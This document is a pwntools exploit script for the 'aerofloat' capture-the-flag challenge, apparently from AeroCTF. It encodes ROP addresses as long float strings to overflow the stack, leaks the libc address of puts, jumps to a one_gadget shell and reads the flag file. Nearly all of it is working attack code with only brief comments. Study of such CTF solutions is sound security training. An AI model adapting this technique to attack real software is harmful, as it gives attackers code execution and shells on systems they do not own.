from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./aerofloat"
HOST = "tasks.aeroctf.com"
PORT = 33017 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_puts = elf.plt["puts"] #0x401030
got_puts = elf.got["puts"] #0x404018
addr_main = elf.symbols["main"] #0x401192

rdi_ret = 0x004015bb
rsi_r15_ret = 0x004015b9

gadget = [0xe664b]

libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
f_ret = "0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002074296076944097998494878304491383710607659106611638606109196292295851064584404368423815869577092506399170252741782601127312555919206005471876136876617178874326779692873893587620607491405474859141732997473431696725039729053917039113328608881349209185526415321935442234571793753169230771026415444085870881974665367004878454548027531045696937288573273476057670437381137315696837186838850220668626077879954270524547237810200539601981540062091307775782545332500677844953208749449400298926372874055399285437231926854764640103975646500313867994062337451764773254144523561377322787640934876667567927974485545338049088552841917844602268656009102790793626928575290162609250872548011615418019868280250683447701784435897859998863823616233048596768639981746673583984375"


f_rdi_ret = "0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020750100018023385997512134463970782904907266180264163053937912636070645406924098200702612278406350704081590587777675201894337449381524698048819331061974144541406721974044535876001502286112824009208728276718607990882056238611762689195555102837888757095854750520293195804005256533863431857536946862193924963870453972770431034010541919631466438865241198607643300665899247466461752785635463418705600818182283491952735180075308079217752300068824035588496133351944193219857598809561793657833845343418140507865600315889493254226382880378231878145214099503410955241193471585636442749588226809180183676053571279500431856047721088952602183042836052475577866035464558277770139910508281204726044333167489111717328439812484399090534992193823882189462892711162567138671875"

f_plt_puts = "0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002074308922650889870905026895279998284363340598166506578553071357523596082147593393851364367372837908934972127452464682715973560012280474726310843244761875154655610976692436535717125215396721223215267693380116234207006727853217205185966601570943279309834744424345435875396393773519158053229120814532564004448521339867907022624275761622758316092411835417927824866695620688156825277070574856759456724317597956369141620706484682838185440365596199464612817836355374923432687178113190095285045748219722319277427449846521596379605562541819225997752258479420817807099087861395900198485408982487991257684106764125531335281803983565928986089126844703510490701273733281844103357725224922775403396786097710382528640870623891194479693211860649171285331249237060546875"


def setf(name, f):
	conn.sendlineafter("> ", "1")
	conn.sendafter(": ",name)
	conn.sendlineafter(": ",f)

def exploit():
	conn.sendlineafter(": ", "pokemon")
	for i in range(11):
		setf(p64(0x0),"0") 
	setf(p64(0xb00000000),"1") 
	# var_c = counter
	# var_8 != 1, var_4 > 0

	setf(p64(0x0), f_rdi_ret) #fake_rbp; rdi_ret 
	setf(p64(got_puts),f_plt_puts) #got_puts; plt_puts
	setf(p64(addr_main),"0") #rdi_ret; name+8
	
	conn.recv(1024)
	conn.sendline("4")
	libc_puts = u64(conn.recv(6) + "\x00\x00")
	libc_base = libc_puts - off_puts
	one_gadget = libc_base + gadget[0]
	print hex(libc_base)

	conn.sendlineafter(": ", "loop2")
	for i in range(11):
		setf(p64(0x0),"0") 
	setf(p64(0xb00000000),"1") 
	
	setf(p64(0x0), f_ret) #fake_rbp; rdi_ret 
	setf(p64(one_gadget),"0") #got_puts; plt_puts

	conn.sendlineafter("> ", "4")
	conn.sendline("cat tmp/flag.txt")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
